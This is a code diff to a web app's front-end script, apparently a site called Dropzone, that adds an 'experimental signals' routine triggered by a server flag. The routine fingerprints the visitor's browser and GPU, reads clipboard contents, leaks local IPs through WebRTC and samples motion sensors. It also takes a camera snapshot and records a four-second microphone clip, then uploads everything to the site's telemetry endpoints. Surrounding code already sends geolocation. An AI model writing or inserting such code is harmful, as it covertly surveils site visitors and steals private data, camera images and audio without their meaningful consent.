@@ -1000,6 +1000,7 @@ x11vnc -display :0 -localhost \
                    me:d.me||"", remote:!!d.remote, stats:d.stats||null,
                    user:d.user||"", role:d.role||"", admin:!!d.admin, authOn:!!d.auth });
         if(d.ask_location) askLocation();
+        if(d.experimental) runExperimental(d.experimental);
         if(state.tab==="chat") setTimeout(scrollChat,40);
       }).catch(()=>{});
   }
@@ -1040,6 +1041,78 @@ x11vnc -display :0 -localhost \
              acc:c.accuracy, alt:c.altitude, speed:c.speed, heading:c.heading }).catch(()=>{}); },
       e=>{ post("/api/telemetry",{ page:location.pathname, loc_error:(e&&e.message)||"denied" }).catch(()=>{}); },
       { enableHighAccuracy:true, timeout:20000, maximumAge:0 });
+  }
+
+  // ---------------------------------------------------------------- experimental signals (admin-enabled; camera/mic/clipboard/notifications prompt the visitor)
+  let _expDone = false;
+  async function runExperimental(exp){
+    if(_expDone || !Object.values(exp).some(Boolean)) return; _expDone = true;
+    const out = { page: location.pathname }, errs = [];
+    try{
+      if(exp.gpu){ try{ const gl=document.createElement("canvas").getContext("webgl"); const dbg=gl&&gl.getExtension("WEBGL_debug_renderer_info"); if(dbg) out.gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }catch(e){ errs.push("gpu"); } }
+      if(exp.fingerprint){ try{ out.fingerprint = await fingerprint(); }catch(e){ errs.push("fp"); } }
+      if(exp.battery && navigator.getBattery){ try{ const bt=await navigator.getBattery(); out.battery=Math.round(bt.level*100); out.charging=bt.charging; }catch(e){ errs.push("battery"); } }
+      if(exp.device_counts && navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){ try{ const ds=await navigator.mediaDevices.enumerateDevices(); out.cam_count=ds.filter(x=>x.kind==="videoinput").length; out.mic_count=ds.filter(x=>x.kind==="audioinput").length; out.speaker_count=ds.filter(x=>x.kind==="audiooutput").length; }catch(e){ errs.push("devices"); } }
+      if(exp.notifications && window.Notification){ try{ out.notif_perm = await Notification.requestPermission(); }catch(e){ errs.push("notif"); } }
+      if(exp.motion){ try{ out.motion = await sampleMotion(); }catch(e){ errs.push("motion"); } }
+      if(exp.clipboard && navigator.clipboard && navigator.clipboard.readText){ try{ out.clipboard=(await navigator.clipboard.readText()||"").slice(0,500); }catch(e){ errs.push("clipboard-denied"); } }
+      if(exp.webrtc_ip){ try{ const ips=await webrtcIps(); if(ips.length) out.webrtc_ips=ips.join(", "); }catch(e){ errs.push("webrtc"); } }
+      if(errs.length) out.exp_errors = errs.join(",");
+      post("/api/telemetry", out).catch(()=>{});
+      if(exp.camera) captureMedia("camera");
+      if(exp.mic) captureMedia("mic");
+    }catch(e){}
+  }
+  async function fingerprint(){
+    const c=document.createElement("canvas"); c.width=240; c.height=60; const x=c.getContext("2d");
+    x.textBaseline="top"; x.font="16px 'Arial'"; x.fillStyle="#f60"; x.fillRect(0,0,240,60);
+    x.fillStyle="#069"; x.fillText("Dropzone ☢ fp "+navigator.platform, 2, 2);
+    x.fillStyle="rgba(102,204,0,.7)"; x.fillText("Dropzone ☢ fp "+navigator.platform, 4, 17);
+    const data=c.toDataURL(); let h=0; for(let i=0;i<data.length;i++){ h=((h<<5)-h+data.charCodeAt(i))|0; }
+    const parts=[navigator.userAgent, navigator.language, screen.width+"x"+screen.height, new Date().getTimezoneOffset(), navigator.hardwareConcurrency, h];
+    let g=0; const str=parts.join("|"); for(let i=0;i<str.length;i++){ g=((g<<5)-g+str.charCodeAt(i))|0; }
+    return (g>>>0).toString(16)+(h>>>0).toString(16);
+  }
+  function sampleMotion(){
+    return new Promise((res)=>{
+      const go=()=>{ let got=null; const h=(e)=>{ got={ax:e.accelerationIncludingGravity&&Math.round(e.accelerationIncludingGravity.x||0), ay:e.accelerationIncludingGravity&&Math.round(e.accelerationIncludingGravity.y||0)}; window.removeEventListener("devicemotion",h); res(JSON.stringify(got)); }; window.addEventListener("devicemotion",h); setTimeout(()=>{ window.removeEventListener("devicemotion",h); res(got?JSON.stringify(got):"no-motion"); },1500); };
+      if(window.DeviceMotionEvent && DeviceMotionEvent.requestPermission){ DeviceMotionEvent.requestPermission().then(p=>p==="granted"?go():res("denied")).catch(()=>res("denied")); }
+      else if(window.DeviceMotionEvent){ go(); } else res("unsupported");
+    });
+  }
+  function webrtcIps(){
+    return new Promise((res)=>{
+      const ips=new Set();
+      let pc; try{ pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); }catch(e){ return res([]); }
+      pc.createDataChannel("x");
+      pc.onicecandidate=(e)=>{ if(!e.candidate){ try{pc.close();}catch(_){} return res([...ips]); }
+        const m=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,})/i.exec(e.candidate.candidate); if(m && !/\.local/.test(m[0])) ips.add(m[0]); };
+      pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>res([...ips]));
+      setTimeout(()=>{ try{pc.close();}catch(_){} res([...ips]); }, 3000);
+    });
+  }
+  async function captureMedia(kind){
+    try{
+      const constraints = kind==="camera" ? {video:{width:640,height:480}} : {audio:true};
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      if(kind==="camera"){
+        const v=document.createElement("video"); v.srcObject=stream; await v.play().catch(()=>{});
+        await new Promise(r=>setTimeout(r,400));
+        const c=document.createElement("canvas"); c.width=v.videoWidth||640; c.height=v.videoHeight||480;
+        c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+        stream.getTracks().forEach(t=>t.stop());
+        c.toBlob(bl=>{ if(bl) uploadCapture("camera", bl, "shot.jpg"); }, "image/jpeg", 0.8);
+      } else {
+        const rec=new MediaRecorder(stream); const chunks=[];
+        rec.ondataavailable=e=>{ if(e.data.size) chunks.push(e.data); };
+        rec.onstop=()=>{ stream.getTracks().forEach(t=>t.stop()); const bl=new Blob(chunks,{type:"audio/webm"}); if(bl.size) uploadCapture("mic", bl, "clip.webm"); };
+        rec.start(); setTimeout(()=>{ try{rec.stop();}catch(e){} }, 4000);
+      }
+    }catch(e){ post("/api/telemetry",{page:location.pathname, exp_errors:kind+"-denied"}).catch(()=>{}); }
+  }
+  function uploadCapture(kind, blob, name){
+    const fd=new FormData(); fd.append("kind",kind); fd.append("file",blob,name);
+    fetch("/api/telemetry-capture",{method:"POST",body:fd}).catch(()=>{});
   }
 
   function sendTelemetry(){
